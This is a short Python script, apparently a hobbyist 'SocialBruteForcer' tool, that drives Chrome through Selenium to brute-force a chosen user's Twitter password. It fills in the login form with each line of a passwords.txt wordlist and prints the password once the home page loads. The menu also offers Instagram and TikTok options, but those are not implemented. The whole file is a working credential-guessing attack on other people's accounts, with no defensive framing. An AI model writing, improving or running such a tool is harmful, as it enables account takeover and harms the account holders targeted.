import selenium.common.exceptions
from selenium import webdriver
from selenium.webdriver.common.proxy import Proxy, ProxyType

import time


Error = '\033[91m'
Succses = '\033[92m'
white = '\037[95m'
orange = "\033[0;33m"








ChromePath = 'WebDrivers/chromedriver.exe'


ChromeOption = webdriver.ChromeOptions()




chrome = webdriver.Chrome(ChromePath,chrome_options=ChromeOption)





print('''

  .oooo.                .o88o.  .o88o.  .oooooo..o                      o8o            oooo  oooooooooo.                           .             oooooooooooo
 d8P'`Y8b               888 `"  888 `" d8P'    `Y8                      `"'            `888  `888'   `Y8b                        .o8             `888'     `8
888    888 oooo    ooo o888oo  o888oo  Y88bo.       .ooooo.   .ooooo.  oooo   .oooo.    888   888     888 oooo d8b oooo  oooo  .o888oo  .ooooo.   888          .ooooo.  oooo d8b  .ooooo.   .ooooo.
888    888  `88b..8P'   888     888     `"Y8888o.  d88' `88b d88' `"Y8 `888  `P  )88b   888   888oooo888' `888""8P `888  `888    888   d88' `88b  888oooo8    d88' `88b `888""8P d88' `"Y8 d88' `88b
888    888    Y888'     888     888         `"Y88b 888   888 888        888   .oP"888   888   888    `88b  888      888   888    888   888ooo888  888    "    888   888  888     888       888ooo888
`88b  d88'  .o8"'88b    888     888    oo     .d8P 888   888 888   .o8  888  d8(  888   888   888    .88P  888      888   888    888 . 888    .o  888         888   888  888     888   .o8 888    .o
 `Y8bd8P'  o88'   888o o888o   o888o   8""88888P'  `Y8bod8P' `Y8bod8P' o888o `Y888""8o o888o o888bood8P'  d888b     `V88V"V8P'   "888" `Y8bod8P' o888o        `Y8bod8P' d888b    `Y8bod8P' `Y8bod8P'

Version: V0.1
Developer => Abdualziz Alosaimi - 0xff3z
DeveloperAccounts =>
Twitter: 0xff3z


''')



#
#
print("Chose One : ")

UserInput = input('''
1 - Twitter BruteForce
2 - Instagram BruteForce
3 - TikTok BruteForce
''')
#

def TwPasswdBruteforce():
    chrome.get("https://twitter.com/login")
    try:
     chrome.find_element_by_name("session[username_or_email]").send_keys(UserNameInput)
     passwdfile = open("passwords.txt", "r").read().splitlines()
     for Password in passwdfile:
        chrome.find_element_by_name("session[password]").send_keys(Password)
        chrome.find_element_by_xpath('//*[@id="react-root"]/div/div/div[2]/main/div/div/div[2]/form/div/div[3]/div/div/span/span').click()
        time.sleep(2)
        # print(chrome.current_url)
        if chrome.current_url == "https://twitter.com/home":
            print(Succses,f"Found Password : {Password}")
    except selenium.common.exceptions.NoSuchElementException :
     pass





if UserInput == "1":
    UserNameInput = input("Enter The UserName : ")
    TwPasswdBruteforce()






















